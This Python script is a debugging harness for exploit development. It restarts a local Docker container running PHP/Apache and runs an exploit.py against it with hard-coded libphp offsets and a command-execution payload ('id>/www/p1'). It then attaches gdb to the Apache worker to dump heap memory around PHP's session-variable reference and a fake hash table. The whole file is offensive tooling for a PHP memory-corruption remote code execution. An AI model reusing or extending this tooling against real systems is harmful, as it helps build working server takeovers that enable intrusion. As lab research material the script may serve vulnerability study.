import os
import subprocess, sys, time, os

BASE = os.path.dirname(os.path.abspath(__file__))
c, port = "p2s8335", "18112"
zif, dtor = "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
sh(f'docker restart {c}')
time.sleep(3)

env = os.environ.copy()
env["P2S_PAUSE"] = "25"
proc = subprocess.Popen(
    [sys.executable, BASE + r"\exploit.py",
     "-u", f"http://127.0.0.1:{port}/index.php",
     "--profile", "bookworm",
     "--zif-offset", zif, "--dtor-offset", dtor,
     "--htdata-offset", "0x690d8",
     "--retries", "1", "--no-retry-rotate",
     "-c", "id>/www/p1", "--fetch", "/www/p1"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, env=env, bufsize=1
)

pause_hit = False
for line in proc.stdout:
    print(line, end="", flush=True)
    if "PAUSE" in line:
        pause_hit = True
        break
if not pause_hit:
    proc.wait(); sys.exit(1)

print("\n[*] PAUSE - dumping R (the reference) + surroundings...", flush=True)
time.sleep(1)

r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1]
r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
B = int(r.stdout.strip().split("-")[0], 16)

# PS(http_session_vars).value = the reference R. Read it from ps_globals+0x140
ps_hsv = B + 0x10432a0 + 0x140
# We'll dump R and surroundings. But R's address is in ps_hsv (first 8 bytes).
# Let gdb read R's address, then dump around it.
gdb_script = (
    "set pagination off\nset confirm off\nset width 0\n"
    f"set $R = *(unsigned long*){hex(ps_hsv)}\n"
    "printf \"R = 0x%%lx\\n\", (unsigned long)$R\n"
    "echo === R-0x60 .. R+0x60 ===\\n"
    "x/40gx $R-0x60\n"
    "echo === fake HT (htdata) ===\\n"
    f"x/24gx {hex(B + 0x0)}\n"  # placeholder, will fix
    "echo ---END---\\n"
)
# Actually htdata = chunk_base + 0x690d8. chunk_base we get from exploit output.
# Let's just dump R surroundings and the ps_globals.
gdb_script = (
    "set pagination off\nset confirm off\nset width 0\n"
    f"set $R = *(unsigned long*){hex(ps_hsv)}\n"
    "print/x $R\n"
    "echo === R-0x80 .. R+0x80 ===\\n"
    "x/40gx $R-0x80\n"
    "echo === R struct ===\\n"
    "x/4gx $R\n"
    "echo ---END---\\n"
)
gl = os.path.join(BASE, "heapdump2.gdb")
with open(gl, "w") as f:
    f.write(gdb_script)
sh(f'docker cp "{gl}" {c}:/tmp/heapdump2.gdb')
sh(f'docker exec {c} sh -c "gdb -batch -p {worker_pid} -x /tmp/heapdump2.gdb > /tmp/heapdump2.out 2>&1"')

r = sh(f'docker exec {c} cat /tmp/heapdump2.out 2>/dev/null')
print("\n=== R (reference) + surroundings ===", flush=True)
print(r.stdout, flush=True)

proc.kill(); proc.wait()
print("\n[*] done", flush=True)
